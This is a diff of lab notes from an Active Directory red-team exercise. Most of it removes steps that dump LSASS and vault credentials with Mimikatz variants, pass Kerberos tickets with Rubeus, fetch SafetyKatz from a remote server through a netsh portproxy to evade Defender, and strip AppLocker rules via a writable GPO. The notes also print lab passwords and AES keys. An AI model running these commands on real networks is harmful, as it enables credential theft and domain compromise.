@@ -224,7 +224,7 @@ TheKeyUs3ron@anyMachine!
 > Questo script restituisce nel laboratorio una **password in chiaro** associata a `srvadmin`. 
 ## 3.3 Create a network-only logon for `srvadmin`
 
-**Where:** student workstation, in the administrative command prompt described by the lab.
+**Where:** student workstation, in the administrative command prompt od `student555` machine.
 ```powershell
 runas /user:dcorp\srvadmin /netonly cmd
 ```
@@ -316,7 +316,6 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa:
 - `listenaddress=0.0.0.0` | Binds the listener to available IPv4 interfaces; it does **not** mean loopback only. |
 - `connectaddress=172.16.100.55` | Defines the remote HFS destination. |
 
-  
 
 > [!NOTE] Perché questo tentativo è utile?
 > Qui vogliamo vedere **l'effetto concreto di AppLocker**: il file eseguibile è presente sul disco, ma il controllo di application allowlisting ne impedisce l'avvio. 
@@ -547,222 +546,15 @@ Unlike the preceding command, this starts a remote `cmd` session rather than exe
 > Sono **tre percorsi di accesso**, non tre versioni del comando finale. Questa distinzione aiuta a non ripetere la stessa procedura e a capire quali sono le vulnerabilità differenti sfruttate nel laboratorio.
 
 
+## Get the service is running our svcadmin
+To understand which is theservice our `svcadmin` is runnign we can do:
+```powershell
+winrs -r:dcorp-mgmt wmic service where "StartName like '%%svcadmin%%'" get Name,DisplayName,ProcessId,PathName,StartName
+```
+- ![[Pasted image 20261123172225.png]]
+
+
 ---
-# GAPS in APPlocker
-In this case we have very stupid rules:
-- `Everyone` can run scripts in `ProgramFiles` directory.
-
-
-In our tool we have a script that can execute `Mimikatz` without executing an `.exe`, that can be detected by the antivirus.The script is:
-- `Invoke-TheKatEx-keys-stdx.ps1`
-
->[!NOTE] 
->This Script extract the credentials stored into LSSAS and shows us the hashes.
-
-## Invoke-TheKatEx-keys-stdx.ps1
-Since we can run scripts in the folder `Program Files` we are able to upload this script on `dcorp-adminsrv` and run it on `Program Files` folder.
-From our student VM we can do:
-```powershell
-Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-stdx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
-```
-- ![[Pasted image 20261122115500.png]]
-
-So now on `dcorp-adminsrv` we do:
-```powershell
-Enter-PSSession dcorp-adminsrv
-cd 'C:\Program Files\'
-.\Invoke-TheKatEx-keys-stdx.ps1
-```
-- ![[Pasted image 20261122153548.png]]
-- We can see the credentials and the hases of the credentials.
-- If there is a session of `srvadmin` you can use it to ask to tgt a ticket.
-
-
-SO if we do on our `student555` machine as administrator:
-```powershell
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:srvadmin /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
-```
-- if we run `winrs -r:dcorp-mgmt cmd` we can see we are on `dcorp-adminsrv` and we can connect to `dcorp-mgmt` with `srvadmin` creds
-- ![[Pasted image 20261122153258.png]]
-
-## Invoke-TheKatEx-vault-stdx.ps1
-We could do the same thing using the `Invoke-TheKatEx-vault-stdx.ps1` script that can extract vault credentials stored in the local registry and not with `LSSAS`.
-
-The procedure is the same:
-From our student VM we can do:
-```powershell
-Copy-Item C:\AD\Tools\Invoke-TheKatEx-vault-stdx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
-```
-- ![[Pasted image 20261122115500.png]]
-
-So now on `dcorp-adminsrv` we do:
-```powershell
-cd 'C:\Program Files\'
-.\Invoke-TheKatEx-vault-stdx.ps1
-```
-- ![[Pasted image 20261122120318.png]]
-- Here we can see that there is a task run by `dcorp\srvadmin` with credential `TheKeyUs3ron@anyMachine!`
-
-In fact if we run a cmd on our student machine in `admin mode` and we run:
-```powershell
-runas /user:dcorp\srvadmin /netonly cmd
-```
-- we obtain a shell using the plain text password `TheKeyUs3ron@anyMachine!`
-
-
-Now we can try to list the machines in which `srvadmin` has local admin privileges:
-```powershell 
-. C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
-
-.  C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
-
-Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
-```
-- ![[Pasted image 20261122121924.png]]
-- We can see that 'srvadmin' has local admin privileges on `dcorp-adminsrv` and on `dcorp-mgmt`.
-
-
-So let access to `dcropt-mgmt` leveraging on `srvadmin` creds found on `dcorp-adminsrv`.
-
-In the shell we created on `dcorp-adminsrv` with `srvadmin` we copy the Loader on `dcorp-mgmt`:
-```powershell
- echo Y | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
-```
-- `Y` if it is already in the folder.
-### 6.5 Portproxy configuration recorded in the lab
-To bypass the block, we can set a tcp forwarding, in order to make Windows defender think we are just doing a request on `localhost`:
-```powershell
-$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.55"
-```
-- ![[Pasted image 20261122123047.png]]
-- `netsh interface portproxy add v4tov4` configures IPv4-to-IPv4 TCP forwarding. 
-- `listenaddress=0.0.0.0` binds the listener to available IPv4 interfaces (not exclusively to loopback), 
-- `listenport=8080` chooses the local listener port 
-- `connectaddress`/`connectport` define the forwarding destination. 
-
-```text
-Connection to 127.0.0.1:8080 on dcorp-mgmt
-                 │
-                 └── TCP forwarding ──> 172.16.100.55:80 (HFS)
-```
-
-
-> [!NOTE] 
-> Il comando crea un listener TCP sulla porta 8080 di `dcorp-mgmt` che inoltra le connessioni verso la porta 80 del server HFS. 
-> `0.0.0.0` significa che l'ascolto non è limitato a `127.0.0.1`; il programma può comunque collegarsi tramite loopback. 
-> L'idea è **setto un TCP forwarding in modo da trasformare le richieste a 127.0.0.1 : 8080 in richieste verso 172.16.100.55:80**, così windows defender non blocca l'esecuzione.
-
-
-### 6.6 Original localhost-based invocation and evidence
-
-Now we are ready to perform the remote execution of `Safetykatz.exe` on `dcorp-mgmt`
-
-```powershell
-$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
-```
-- ![[Pasted image 20261122123125.png|648]]
-
-### 8.2 Original Rubeus
-
-What we want to do now, is to request a ticket to kerberos using the `aes256` hash credentials of `svcadmin` in order to connect a shell to `dcorp-mgmt`
-
-In our student machine with `admin privileges`:
-```powershell
-
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
-
-```
-- ![[Pasted image 20261122123420.png]]
-	- `C:\AD\Tools\Loader.exe` | Runs the loader located on the lab workstation. |
-	- `-path C:\AD\Tools\Rubeus.exe` | Specifies the Rubeus executable that the loader is intended to run. |
-	- `-args asktgt` | Supplies Rubeus arguments and selects the TGT-request functionality. |
-	- `/user:svcadmin` | Identifies the Kerberos account involved in the request. |
-	- `/aes256:<key>` | Supplies a Kerberos AES256 long-term key; the lab command contains its original hexadecimal value. |
-	- `/opsec` | Requests Rubeus's alternative, operational-security-oriented behavior; it is not a guarantee of stealth.  
-	- `/createnetonly:C:\Windows\System32\cmd.exe` | Creates a process with a separate **network-only** logon context.  
-	- `/show` | Requests display of ticket-related information produced by the operation.
-	- `/ptt` | Requests submission of the obtained ticket into the relevant Windows logon session (*pass-the-ticket*). |
-
->[!IMPORTANT] This command can be executed only in a cmd opened as **administrator** on the student VM
->![[Pasted image 20261120160457.png]]
-
-
-
-
-> [!NOTE] Cosa fa il comando?
- Il programma `Loader.exe` richiama `Rubeus.exe` con i parametri indicati. 
- `asktgt` riguarda la richiesta di un Ticket Granting Ticket per l'account `svcadmin`, mentre `/aes256` identifica la **chiave Kerberos AES256** utilizzata in quella richiesta: **non è un hash `des_cbc_md4`**. 
- La parte `/createnetonly` crea un nuovo processo `cmd.exe` con un contesto specifico per le autenticazioni verso la rete; `/ptt` riguarda l'associazione del ticket a una sessione di accesso. È importante non confondere questi meccanismi con un cambio dell'identità locale del processo.
-
-
-
-# Disable Applocker by modyfing GPO applicable to `dcorp-adminsrv`
-
-We can escalate to `dcorp-mgmt` also leveraging on `Group Policies`
-
-In fact, we can see that each `student` user ha access to `RDPUsers` group.
-
-`RDPUsers` has `Generic Write` permissions on `APPLOCKER GPO`.
-
-`APPLockerGPO` affects `Applocked OU`. 
-
-In `Applocked OU` there is `DCORP-ADMINSRV` .
-
-SO if we change `AppLockerGPO` with using our `student` user that is part of `RDPUsers` group, we can affect the `dcorp-adminsrv` `APPlocker` rules.
-- ![[Pasted image 20261122140218.png|621]]
-- ![[Pasted image 20261122140245.png|503]]
-
-## .exe execution blocked
-We have access to `dcorp-adminsrv`.
-
-We open a cmd on `dcorp-adminsrv` and try to execute `safetykatz` copying the loader in the public folder of `dcorp-mgmt`, setting the tcp forwarding rule and downloading it from studentVM:
-```powershell
- echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
- 
- winrs -r:dcorp-adminsrv cmd
- 
-netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.55
-
-C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::evasive-keys" "exit"
-
-```
-- ![[Pasted image 20261122141955.png]]
-- We can see that `AppLocker` blocks the execution of our `Loader.exe`
-
-But we know that `student555` leveraging on `RDPUsers` can change the `GPO` of `APPLocker`.
-
-So what we do is:
-1. Run a `admin` cmd on `student555` VM
-2. run `gpmc.msc`
-```powershell
-gpmc.msc
-```
-3. `Forrest` -> `Domains` -> `dollarcorp...`-> `Applocked`->`Applocker`->`Edit` -> 'Policies' -> `Windows Settings` -> `Security settings` -> `Application Control Policies` -> `AppLocker` -> `Executable Rules` -> `Remove the rule`
-	1. ![[Pasted image 20261122142646.png|514]]
-	2. ![[Pasted image 20261122142733.png|510]]
-
-
-Now we force on `dcorp-adminsrv` the update of the GPOs:
-```powershell
-gpupdate /force
-```
-- ![[Pasted image 20261122142916.png]]
-
-At this point we can redo the execution:
-```powershell
-C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::evasive-keys" "exit"
-```
-- ![[Pasted image 20261122152656.png]]
-
-SO if we do on our `student555` machine as administrator:
-```powershell
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:srvadmin /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
-```
-- if we run `winrs -r:dcorp-mgmt cmd` we can see we are on `dcorp-adminsrv` and we can connect to `dcorp-mgmt` with `srvadmin` creds
-- ![[Pasted image 20261122153258.png]]
-
-
-
 
 
 ![[Pasted image 20261122171848.png]]
